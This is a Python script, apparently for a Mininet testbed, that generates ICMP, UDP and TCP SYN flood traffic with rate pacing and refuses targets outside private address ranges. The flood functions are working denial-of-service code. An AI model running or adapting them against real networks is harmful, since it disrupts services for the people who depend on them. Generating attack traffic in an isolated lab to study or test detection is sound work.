"""Isolated Mininet attack generator.

This script is intentionally restricted to RFC1918 lab targets so that it is
not accidentally used against public systems. Use only inside your own
Mininet/VM testbed.
"""
from __future__ import annotations

import argparse
import ipaddress
import socket
import struct
import time

LAB_NETS = [ipaddress.ip_network("10.0.0.0/8"), ipaddress.ip_network("172.16.0.0/12"), ipaddress.ip_network("192.168.0.0/16")]


def validate_target(target):
    ip = ipaddress.ip_address(target)
    if not any(ip in n for n in LAB_NETS):
        raise SystemExit("Refusing target outside a private/lab IPv4 range.")


def icmp_flood(target, pps, duration):
    # Linux ICMP raw socket; Mininet attacker namespaces run as root.
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    payload = b"PAML-ATC-LAB" * 8
    header = struct.pack("!BBHHH", 8, 0, 0, 0, 1)
    checksum = _checksum(header + payload)
    packet = struct.pack("!BBHHH", 8, 0, checksum, 0, 1) + payload
    _paced_send(s.sendto, packet, (target, 0), pps, duration)


def udp_flood(target, pps, duration):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"PAML-ATC-UDP" * 16
    _paced_send(s.sendto, payload, (target, 9000), pps, duration)


def tcp_syn_flood(target, pps, duration):
    # Prefer hping3 in the Mininet namespace because it creates valid TCP SYNs.
    import subprocess
    validate_target(target)
    count = max(1, int(pps * duration))
    cmd = ["hping3", "-S", "-p", "80", "-c", str(count), "-i", f"u{max(1, int(1_000_000 / max(pps,1)))}", target]
    subprocess.run(cmd, check=False)


def _paced_send(fn, data, addr, pps, duration):
    interval = 1.0 / max(float(pps), 1.0)
    end = time.monotonic() + duration
    sent = 0
    while time.monotonic() < end:
        fn(data, addr)
        sent += 1
        time.sleep(interval)
    print(f"sent_packets={sent}")


def _checksum(data):
    if len(data) % 2: data += b"\0"
    total = sum((data[i] << 8) + data[i+1] for i in range(0, len(data), 2))
    total = (total & 0xffff) + (total >> 16)
    total = (total & 0xffff) + (total >> 16)
    return (~total) & 0xffff


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--protocol", choices=["ICMP", "UDP", "TCP_SYN"], required=True)
    p.add_argument("--target", required=True)
    p.add_argument("--pps", type=int, default=300)
    p.add_argument("--duration", type=float, default=10.0)
    args = p.parse_args()
    validate_target(args.target)
    if args.pps <= 0 or args.duration <= 0: raise SystemExit("pps and duration must be positive")
    if args.protocol == "ICMP": icmp_flood(args.target, args.pps, args.duration)
    elif args.protocol == "UDP": udp_flood(args.target, args.pps, args.duration)
    else: tcp_syn_flood(args.target, args.pps, args.duration)
